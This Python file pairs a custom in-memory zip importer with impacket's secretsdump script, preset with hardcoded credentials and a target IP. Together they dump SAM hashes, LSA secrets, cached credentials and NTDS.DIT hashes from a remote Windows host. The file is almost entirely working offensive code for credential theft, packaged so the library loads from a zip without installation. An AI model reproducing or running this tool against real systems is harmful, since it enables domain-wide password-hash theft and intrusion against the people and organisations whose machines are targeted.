import logging
import io
import zipfile
import random
import string
from pathlib import Path
import importlib
import importlib.machinery
import io
from pathlib import Path
import sys
import types
import zipfile
from zipfile import ZipFile, ZipInfo


### ========================================================= ###
### ====================== Custom Stuff ===================== ###
### ========================================================= ###

def _create_paths(module_name, suffixes=['py']):
    """ Returns possible paths where a module/package could be located

    Args:
        module_name (str): The name of the module to create paths for
        suffixes (list): A list of suffixes to be appended to the possible filenames

    Returns:
        list: The list of filepaths to be queried for module/package content
    """
    module_name = module_name.replace(".", "/")
    ret = []
    for suffix in suffixes:
        ret.extend([
            "%s.%s" % (module_name, suffix),
            "%s/__init__.%s" % (module_name, suffix),
        ])
    return ret

def _read_archive(content: bytes) -> ZipFile:
    """ Returns an ZipFile Archive object if available

    Args:
        content (bytes): Bytes to be parsed as archive

    Returns:
        object: zipfile.ZipFile (raises exception if `contents` could not be parsed)
    """
    content_io = io.BytesIO(content)
    return zipfile.ZipFile(content_io)


def _write_pyd_dependencies(zipname: str, archive: ZipFile) -> list[str] :
    """ Writes python specific dependencies (pyd files) included in some Python packages to disk

    Args:
        Content: Bytes to be parsed as an archive

    Returns:
        list[str]: List of pyd dependencies written on disk
    """
    pyd_deps = []
    fake_dir = Path(zipname)
    fake_dir.mkdir(parents=True, exist_ok=True)

    for i in archive.filelist:
        filename = Path(i.filename)
        if filename.suffix == ".pyd":
           archive.extract(i, path=str(fake_dir))
           print(f"[+] Found and extracted pyd file {filename} to {fake_dir / filename}")
           pyd_deps.append(fake_dir / filename)
    return pyd_deps


def _write_external_dependencies(archive: ZipFile, extensions: list[str]) -> list[str] :
    """ Finds dependencies such as DLL files included in some Python packages

    Args:
        Content: Bytes to be parsed as an archive
        Extension: Extension type to find

    Returns:
        list[str]: List of external dependencies written on disk
    """
    dependencies = []

    for i in archive.filelist:
        filename = Path(i.filename)
        for ext in extensions:
            if filename.suffix == ext:
                with open(filename.name, "wb") as f:
                    f.write(archive.read(i))
                print(f"[+] Found and extracted external dependency : {filename} to {filename.name}")
                dependencies.append(Path(filename.name))
    return dependencies


def _custom_open_archive_file(archive_obj, filepath):
    """ Opens a file located under `filepath` from an archive

    Args:
        archive_obj (object): zipfile.ZipFile
        filepath (str): The path in the archive to be extracted and returned

    Returns:
        bytes: The content of the extracted file
    """
    if isinstance(archive_obj, zipfile.ZipFile):
        return archive_obj.open(filepath, 'r').read()

    raise ValueError("Object is not a ZIP or TAR archive")


class CustomImporter(object):
    """ 
    The class that implements the Importer API. Contains the `find_module` and `load_module` methods.
    """

    def __init__(self, zipname, zipbytes, dependencies_ext=[]):
        self.zipname = zipname
        self.modules = {}
        self.archive = _read_archive(zipbytes)
        self.external_deps = _write_external_dependencies(self.archive, dependencies_ext)
        self.pyd_deps = _write_pyd_dependencies(zipname, self.archive)

    def get_dependencies(self) -> list[ZipInfo]:
        return [*self.external_deps, *self.pyd_deps]

    def find_spec(self, fullname, path, target=None):
        loader = self.find_module(fullname, path)
        if loader is not None:
            is_pkg = self.modules.get(fullname, {}).get('package', False)
            spec = importlib.machinery.ModuleSpec(fullname, loader, is_package=is_pkg)
            if is_pkg:
                spec.submodule_search_locations = [f"{self.zipname}/{fullname.replace('.', '/')}/"]
            return spec
        return None

    def find_module(self, fullname, path=None):
        """ Method that determines whether a module/package can be loaded through this Importer object. Part of Importer API

        Args:
            fullname (str): The name of the package/module to be searched.
            path (str): Part of the Importer API. Not used in this object.

        Returns:
          (object): This Importer object (`self`) if the module can be importer
            or `None` if the module is not available.
        """

        paths = _create_paths(fullname)
        for path in paths:
            try:
                content = _custom_open_archive_file(self.archive, path)
                print(f"[+] Extracted {path} from archive. The module can be loaded!")
                self.modules[fullname] = {}
                self.modules[fullname]['content'] = content
                self.modules[fullname]['filepath'] = self.zipname + '/' + path
                self.modules[fullname]['package'] = path.endswith('__init__.py')
                return self
            except KeyError as e:
                continue
        #print(f"[-] Module {fullname} cannot be loaded from {self.zipname}. Skipping...")
        # We can debug where these module are loaded from later on with LoaderTrackingPathFinder below

        # Instruct 'import' to move on to next Importer
        return None

    def create_module(self, spec):
        fullname = spec.name

        if fullname not in self.modules:
            print("[*] Module '%s' has not been attempted before. Trying to load..." % fullname)
            # Run 'find_module' and see if it is loadable through this Importer object
            if self.find_module(fullname) is not self:
                #logger.info("[-] Module '%s' has not been found as loadable. Failing..." % fullname)
                # If it is not loadable ('find_module' did not return 'self' but 'None'):
                # throw error:
                raise ImportError(
                    "Module '%s' cannot be loaded from '%s'" %
                    (fullname, self.zipname))

        mod = types.ModuleType(fullname)
        mod.__loader__ = self
        mod.__file__ = self.modules[fullname]['filepath']
        # Set module path - get filepath and keep only the path until filename
        mod.__path__ = ['/'.join(mod.__file__.split('/')[:-1]) + '/']
        mod.__url__ = self.modules[fullname]['filepath']

        mod.__package__ = fullname

        # Populate subpackage '__package__' metadata with parent package names
        pkg_name = '.'.join(fullname.split('.')[:-1])
        if len(fullname.split('.')[:-1]) > 1 and not self.modules[fullname]['package']:
            # recursively find the parent package
            while sys.modules[pkg_name].__package__ != pkg_name:
                pkg_name = '.'.join(pkg_name.split('.')[:-1])
            mod.__package__ = pkg_name
        elif not self.modules[fullname]['package']:
            mod.__package__ = pkg_name.split('.')[0]

        print(f"[*] Metadata (__package__) set to {mod.__package__} : __filepath__ to {mod.__path__},  __name__ to {mod.__name__} for {'package' if self.modules[fullname]['package'] else 'module'} {fullname}")

        self.modules[fullname]['module'] = mod
        return mod

    def exec_module(self, module):
        fullname = module.__name__
        return self._create_module(fullname)

    def _create_module(self, fullname, sys_modules=True):
        """ Method that loads module/package code into a Python Module object

        Args:
          fullname (str): The name of the module/package to be loaded
          sys_modules (bool, optional): Set to False to not inject the module into sys.modules
            It will fail for packages/modules that contain relative imports

        Returns:
          (object): Module object containing the executed code of the specified module/package

        """

        # If the module has not been found as loadable
        # through 'find_module' method (yet)
        if fullname not in self.modules:
            spec = self.find_spec(fullname, "")
            if spec is not None:
                module = self.create_module(spec)
            else:
                raise ImportError
        else:
            module = self.modules[fullname]['module']

        if sys_modules:
            sys.modules[fullname] = module

        # Execute the module/package code into the Module object
        try:
            exec(self.modules[fullname]['content'], module.__dict__)
        except BaseException as e:
            if not sys_modules:
                # This check should never be reached, we are always injecting our module into sys.modules and never removing it even if it fails. 
                print(f"[-] Module/Package {fullname} cannot be imported without adding it to sys.modules. Might contain relative imports")
            else:
                #del sys.modules[fullname]
                # We don't remove the module if the import failed. 
                # Example with deletion: 
                # impacket.dpapi depends on Cryptodome.PublicKey.RSA and if Cryptodome.PublicKey.RSA fails to import, we remove impacket.dpapi
                # But, impacket.examples.secretdump attempts to import impacket.dpapi and will fail with KeyError, because sys.modules['impacket.dpapi'] doesn't exist
                # But leaving a "broken" package in sys.modules, we can ensure that other packages that depend on it still import correctly. 
                # I have no idea what happens if the broken package is really broken. 
                pass
        return module


def remove_customimporter(zipname):
    """ Removes from the 'sys.meta_path' an CustomImporter object given its package name.

    Args:
      zipname (str): The name of the CustomImporter to remove
    """
    for importer in sys.meta_path:
        try:
            if importer.zipname == zipname:
                sys.meta_path.remove(importer)
                return True
        except AttributeError as e:
            pass
    return False


def add_remote_bytes(zipname: str, zipbytes: bytes, dependencies_ext: list[str] = [], importer_class=CustomImporter):
    """ Creates an CustomImporter object and adds it to the `sys.meta_path`.

    Args:
        zipname (str): Name of the zip file
        zipbytes (str): Zip bytes (supported: .zip)

    Returns:
      CustomImporter: The `CustomImporter` object added to the `sys.meta_path`
    """
    importer = importer_class(
        zipname,
        zipbytes,
        dependencies_ext
    )
    sys.meta_path.insert(0, importer)
    sys.path.insert(0, str(Path(zipname).absolute()))
    return importer


###--------------------###
### Put your code here ###
###--------------------###

zip_name = "impacket-packages.zip"
with open(zip_name, "rb") as f:
    zipbytes = f.read()

importer = add_remote_bytes(
    zipname=''.join(random.choices(string.ascii_letters + string.digits, k=8)),
    zipbytes=zipbytes)
zipname = importer.zipname


import argparse
import codecs
import logging
import os
import sys


#from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection

from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
from impacket.krb5.keytab import Keytab
try:
    input = raw_input
except NameError:
    pass


username_domain="admin"
password_domain="password"
domain_impacket="domain.local"
target_host = "192.168.1.1"

print("[SECRETSDUMP] Executing Secretsdump on " + target_host + " as user "+ username_domain)

class DumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.__useVSSMethod = options.use_vss
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__systemHive = options.system
        self.__bootkey = options.bootkey
        self.__securityHive = options.security
        self.__samHive = options.sam
        self.__ntdsFile = options.ntds
        self.__history = options.history
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = options.outputfile
        self.__doKerberos = options.k
        self.__justDC = options.just_dc
        self.__justDCNTLM = options.just_dc_ntlm
        self.__justUser = options.just_dc_user
        self.__pwdLastSet = options.pwd_last_set
        self.__printUserStatus= options.user_status
        self.__resumeFileName = options.resumefile
        self.__canProcessSAMLSA = True
        self.__kdcHost = options.dc_ip
        self.__options = options

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        try:
            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
                self.__isRemote = False
                self.__useVSSMethod = True
                if self.__systemHive:
                    localOperations = LocalOperations(self.__systemHive)
                    bootKey = localOperations.getBootKey()
                    if self.__ntdsFile is not None:
                    # Let's grab target's configuration about LM Hashes storage
                        self.__noLMHash = localOperations.checkNoLMHashPolicy()
                else:
                    import binascii
                    bootKey = binascii.unhexlify(self.__bootkey)

            else:
                self.__isRemote = True
                bootKey = None
                try:
                    try:
                        self.connect()
                    except Exception as e:
                        if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                            pass
                        else:
                            raise

                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                    self.__remoteOps.setExecMethod(self.__options.exec_method)
                    if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
                        self.__remoteOps.enableRegistry()
                        bootKey             = self.__remoteOps.getBootKey()
                        # Let's check whether target system stores LM Hashes
                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
                except Exception as e:
                    self.__canProcessSAMLSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                        and self.__doKerberos is True:
                        # Giving some hints here when SPN target name validation is set to something different to Off
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                        logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                    else:
                        logging.error('RemoteOperations failed: %s' % str(e))

            # If RemoteOperations succeeded, then we can extract SAM and LSA
            if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
                try:
                    if self.__isRemote is True:
                        SAMFileName         = self.__remoteOps.saveSAM()
                    else:
                        SAMFileName         = self.__samHive

                    self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
                    self.__SAMHashes.dump()
                    if self.__outputFileName is not None:
                        self.__SAMHashes.export(self.__outputFileName)
                except Exception as e:
                    logging.error('SAM hashes extraction failed: %s' % str(e))

                try:
                    if self.__isRemote is True:
                        SECURITYFileName = self.__remoteOps.saveSECURITY()
                    else:
                        SECURITYFileName = self.__securityHive

                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                   isRemote=self.__isRemote, history=self.__history)
                    self.__LSASecrets.dumpCachedHashes()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportCached(self.__outputFileName)
                    self.__LSASecrets.dumpSecrets()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportSecrets(self.__outputFileName)
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error('LSA hashes extraction failed: %s' % str(e))

            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
            if self.__isRemote is True:
                if self.__useVSSMethod and self.__remoteOps is not None:
                    NTDSFileName = self.__remoteOps.saveNTDS()
                else:
                    NTDSFileName = None
            else:
                NTDSFileName = self.__ntdsFile

            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                           useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                           pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                           outputFileName=self.__outputFileName, justUser=self.__justUser,
                                           printUserStatus= self.__printUserStatus)
            try:
                self.__NTDSHashes.dump()
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                    resumeFile = self.__NTDSHashes.getResumeSessionFile()
                    if resumeFile is not None:
                        os.unlink(resumeFile)
                logging.error(e)
                if self.__justUser and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >=0:
                    logging.info("You just got that error because there might be some duplicates of the same name. "
                                 "Try specifying the domain name for the user as well. It is important to specify it "
                                 "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
                elif self.__useVSSMethod is False:
                    logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
            self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            if self.__NTDSHashes is not None:
                if isinstance(e, KeyboardInterrupt):
                    while True:
                        answer =  input("Delete resume session file? [y/N] ")
                        if answer.upper() == '':
                            answer = 'N'
                            break
                        elif answer.upper() == 'Y':
                            answer = 'Y'
                            break
                        elif answer.upper() == 'N':
                            answer = 'N'
                            break
                    if answer == 'Y':
                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
            try:
                self.cleanup()
            except:
                pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()


# Process command-line arguments.
if __name__ == '__main__':
    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    #print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
                                                      "the remote machine without executing any agent there.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                       ' (if you want to parse local files)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-system', action='store', help='SYSTEM hive to parse')
    parser.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
    parser.add_argument('-security', action='store', help='SECURITY hive to parse')
    parser.add_argument('-sam', action='store', help='SAM hive to parse')
    parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
    parser.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                         'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                         'state')
    parser.add_argument('-outputfile', action='store',
                        help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
    parser.add_argument('-use-vss', action='store_true', default=False,
                        help='Use the VSS method insead of default DRSUAPI')
    parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                        'method to use at target (only when using -use-vss). Default: smbexec')
    group = parser.add_argument_group('display options')
    group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                       help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                            'Implies also -just-dc switch')
    group.add_argument('-just-dc', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
    group.add_argument('-just-dc-ntlm', action='store_true', default=False,
                       help='Extract only NTDS.DIT data (NTLM hashes only)')
    group.add_argument('-pwd-last-set', action='store_true', default=False,
                       help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
    group.add_argument('-user-status', action='store_true', default=False,
                        help='Display whether or not the user is disabled')
    group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                             ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                            ' (128 or 256 bits)')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                 'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')

    #if len(sys.argv)==1:
    #    parser.print_help()
    #    sys.exit(1)

    target_string= domain_impacket + '/' + username_domain + ':' + password_domain + '@' + target_host
    options = parser.parse_args([target_string])


    # Init the example's logger theme
    logger.init(options.ts)

    #if options.debug is True:
    #    logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
    #    logging.debug(version.getInstallationPath())
    #else:
    logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.target)

    if options.just_dc_user is not None:
        if options.use_vss is True:
            logging.error('-just-dc-user switch is not supported in VSS mode')
            sys.exit(1)
        elif options.resumefile is not None:
            logging.error('resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch')
            sys.exit(1)
        elif remoteName.upper() == 'LOCAL' and username == '':
            logging.error('-just-dc-user not compatible in LOCAL mode')
            sys.exit(1)
        else:
            # Having this switch on implies not asking for anything else.
            options.just_dc = True

    if options.use_vss is True and options.resumefile is not None:
        logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
        sys.exit(1)

    if remoteName.upper() == 'LOCAL' and username == '' and options.resumefile is not None:
        logging.error('resuming a previous NTDS.DIT dump session is not supported in LOCAL mode')
        sys.exit(1)

    if remoteName.upper() == 'LOCAL' and username == '':
        if options.system is None and options.bootkey is None:
            logging.error('Either the SYSTEM hive or bootkey is required for local parsing, check help')
            sys.exit(1)
    else:

        if options.target_ip is None:
            options.target_ip = remoteName

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True


    dumper = DumpSecrets(remoteName, username, password, domain, options)
    try:
        dumper.dump()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)


###---------###
### Cleanup ###
###---------###

written_deps = importer.get_dependencies()
print(f"[!] If needed, remove the dependencies that were written to disk:\n{written_deps}")
remove_customimporter(zipname)
